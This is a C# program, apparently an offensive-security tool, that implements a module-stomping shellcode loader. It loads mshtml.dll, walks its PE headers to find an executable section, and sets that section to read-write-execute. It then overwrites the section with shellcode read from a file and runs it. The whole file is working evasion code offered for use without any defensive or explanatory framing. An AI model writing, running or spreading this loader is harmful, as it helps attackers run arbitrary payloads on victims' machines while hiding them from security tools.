using System;
using System.IO;
using System.Runtime.InteropServices;

public class Program
{
    // P/Invoke Signatures for WinAPI functions
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out uint lpflOldProtect);

    // Memory and Protection Constants
    const uint PAGE_EXECUTE_READ = 0x20;
    const uint PAGE_EXECUTE_READWRITE = 0x40;
    const uint IMAGE_SCN_MEM_EXECUTE = 0x20000000;

    // Delegate for shellcode execution
    [UnmanagedFunctionPointer(CallingConvention.StdCall)]
    delegate void RunShellcode();

    // PE Header Structures
    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_DOS_HEADER
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 2)]
        public char[] e_magic;
        public UInt16 e_cblp;
        public UInt16 e_cp;
        public UInt16 e_crlc;
        public UInt16 e_cparhdr;
        public UInt16 e_minalloc;
        public UInt16 e_maxalloc;
        public UInt16 e_ss;
        public UInt16 e_sp;
        public UInt16 e_csum;
        public UInt16 e_ip;
        public UInt16 e_cs;
        public UInt16 e_lfarlc;
        public UInt16 e_ovno;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 4)]
        public UInt16[] e_res1;
        public UInt16 e_oemid;
        public UInt16 e_oeminfo;
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 10)]
        public UInt16[] e_res2;
        public Int32 e_lfanew;

        private string e_magic_string
        {
            get { return new string(e_magic); }
        }

        public bool IsValid
        {
            get { return e_magic_string == "MZ"; }
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_FILE_HEADER
    {
        public UInt16 Machine;
        public UInt16 NumberOfSections;
        public UInt32 TimeDateStamp;
        public UInt32 PointerToSymbolTable;
        public UInt32 NumberOfSymbols;
        public UInt16 SizeOfOptionalHeader;
        public UInt16 Characteristics;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_OPTIONAL_HEADER64
    {
        public UInt16 Magic;
        public Byte MajorLinkerVersion;
        public Byte MinorLinkerVersion;
        public UInt32 SizeOfCode;
        public UInt32 SizeOfInitializedData;
        public UInt32 SizeOfUninitializedData;
        public UInt32 AddressOfEntryPoint;
        public UInt32 BaseOfCode;
        public UInt64 ImageBase;
        public UInt32 SectionAlignment;
        public UInt32 FileAlignment;
        public UInt16 MajorOperatingSystemVersion;
        public UInt16 MinorOperatingSystemVersion;
        public UInt16 MajorImageVersion;
        public UInt16 MinorImageVersion;
        public UInt16 MajorSubsystemVersion;
        public UInt16 MinorSubsystemVersion;
        public UInt32 Win32VersionValue;
        public UInt32 SizeOfImage;
        public UInt32 SizeOfHeaders;
        public UInt32 CheckSum;
        public UInt16 Subsystem;
        public UInt16 DllCharacteristics;
        public UInt64 SizeOfStackReserve;
        public UInt64 SizeOfStackCommit;
        public UInt64 SizeOfHeapReserve;
        public UInt64 SizeOfHeapCommit;
        public UInt32 LoaderFlags;
        public UInt32 NumberOfRvaAndSizes;
    }

    [StructLayout(LayoutKind.Sequential)]
    public struct IMAGE_NT_HEADERS64
    {
        public UInt32 Signature;
        public IMAGE_FILE_HEADER FileHeader;
        public IMAGE_OPTIONAL_HEADER64 OptionalHeader;
    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct IMAGE_SECTION_HEADER
    {
        [MarshalAs(UnmanagedType.ByValArray, SizeConst = 8)]
        public byte[] Name;
        public uint VirtualSize;
        public uint VirtualAddress;
        public uint SizeOfRawData;
        public uint PointerToRawData;
        public uint PointerToRelocations;
        public uint PointerToLinenumbers;
        public ushort NumberOfRelocations;
        public ushort NumberOfLinenumbers;
        public uint Characteristics;
    }

    public static void Main(string[] args)
    {
        if (args.Length < 1)
        {
            Console.WriteLine("Usage: Program.exe <path_to_shellcode.bin>");
            return;
        }

        byte[] payload;
        try
        {
            payload = File.ReadAllBytes(args[0]);
        }
        catch (IOException ex)
        {
            Console.WriteLine(string.Format("Error reading file: {0}", ex.Message));
            return;
        }

        // 1. Load a legitimate DLL
        string dllName = "mshtml.dll";
        IntPtr moduleBase = LoadLibrary(dllName);
        if (moduleBase == IntPtr.Zero)
        {
            Console.WriteLine(string.Format("Failed to load {0}", dllName));
            return;
        }

        // 2. Parse PE header to find the executable section
        IntPtr textSectionAddr = IntPtr.Zero;
        uint textSectionSize = 0;

        IMAGE_DOS_HEADER dosHeader = (IMAGE_DOS_HEADER)Marshal.PtrToStructure(moduleBase, typeof(IMAGE_DOS_HEADER));
        IntPtr ntHeadersPtr = new IntPtr(moduleBase.ToInt64() + dosHeader.e_lfanew);
        IMAGE_NT_HEADERS64 ntHeaders = (IMAGE_NT_HEADERS64)Marshal.PtrToStructure(ntHeadersPtr, typeof(IMAGE_NT_HEADERS64));

        IntPtr sectionHeaderPtr = new IntPtr(ntHeadersPtr.ToInt64() + Marshal.SizeOf(typeof(IMAGE_NT_HEADERS64)));
        
        for (int i = 0; i < ntHeaders.FileHeader.NumberOfSections; i++)
        {
            IMAGE_SECTION_HEADER sectionHeader = (IMAGE_SECTION_HEADER)Marshal.PtrToStructure(sectionHeaderPtr, typeof(IMAGE_SECTION_HEADER));
            
            // Check for executable section that is large enough
            if ((sectionHeader.Characteristics & IMAGE_SCN_MEM_EXECUTE) != 0 && sectionHeader.SizeOfRawData >= payload.Length)
            {
                textSectionAddr = new IntPtr(moduleBase.ToInt64() + sectionHeader.VirtualAddress);
                textSectionSize = sectionHeader.SizeOfRawData;
                break;
            }
            sectionHeaderPtr = new IntPtr(sectionHeaderPtr.ToInt64() + Marshal.SizeOf(typeof(IMAGE_SECTION_HEADER)));
        }

        if (textSectionAddr == IntPtr.Zero)
        {
            Console.WriteLine("Could not find a suitable executable section in the loaded module.");
            return;
        }

        // 3. Change memory permissions to RWX
        uint oldProtect;
        if (!VirtualProtect(textSectionAddr, (UIntPtr)payload.Length, PAGE_EXECUTE_READWRITE, out oldProtect))
        {
            Console.WriteLine("Failed to change memory protection to RWX.");
            return;
        }

        // 4. Copy shellcode into the section
        Marshal.Copy(payload, 0, textSectionAddr, payload.Length);

        // 5. Revert memory permissions to RX
        uint _temp;
        if (!VirtualProtect(textSectionAddr, (UIntPtr)payload.Length, PAGE_EXECUTE_READ, out _temp))
        {
            Console.WriteLine("Failed to revert memory protection to RX.");
            // Continue execution anyway, but note the increased risk
        }

        // 6. Execute shellcode
        RunShellcode func = (RunShellcode)Marshal.GetDelegateForFunctionPointer(textSectionAddr, typeof(RunShellcode));
        func();
    }
}